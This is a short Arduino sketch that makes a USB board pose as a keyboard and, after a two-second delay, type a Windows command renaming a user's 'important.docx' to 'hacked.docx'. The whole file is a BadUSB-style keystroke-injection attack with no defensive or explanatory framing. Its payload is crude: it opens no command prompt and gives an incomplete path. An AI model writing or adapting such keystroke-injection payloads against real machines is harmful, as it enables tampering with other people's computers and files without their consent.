#include "Arduino.h"
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void setup() {
    USB.begin();
    Keyboard.begin();
    delay(2000);
    Keyboard.println("cmd /c ren C:\\Users\\Documents\\important.docx \"hacked.docx\"");
}

void loop() {}
